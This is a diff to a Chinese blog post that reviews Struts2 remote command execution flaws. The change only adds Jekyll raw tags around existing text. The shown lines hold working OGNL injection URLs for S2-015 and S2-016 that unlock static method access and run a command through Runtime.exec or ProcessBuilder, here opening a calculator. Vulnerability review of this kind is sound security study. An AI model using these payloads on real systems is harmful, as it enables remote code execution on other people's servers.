@@ -169,7 +169,9 @@ S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 `$
     
 可以构造 Payload 如下：
 
+{% raw %}
     http://localhost:8080/S2-015/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('calc')}.action
+{% endraw %}
 
 ![]({{ site.url }}/public/img/article/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/8.png)
 
@@ -198,6 +200,7 @@ S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 `$
 
 `DefaultActionMapper` 类支持以 `action:`，`redirect:` 和 `redirectAction:` 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行，经测试发现 `redirect:` 和 `redirectAction:` 这两个前缀比较好容易构造出命令执行的 Payload（转义后）：
 
+{% raw %}
     http://localhost:8080/S2-016/default.action?redirect:${%23context['xwork.MethodAccessor.denyMethodExecution']%3Dfalse,%23f%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open%20%2fApplications%2fCalculator.app')}
     
     或者
@@ -205,6 +208,7 @@ S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 `$
     http://localhost:8080/S2-016/default.action?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'open','/Applications/Calculator.app'})).start()}
 
 ![]({{ site.url }}/public/img/article/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/10.png)
+{% endraw %}
 
 ### S2-029
 
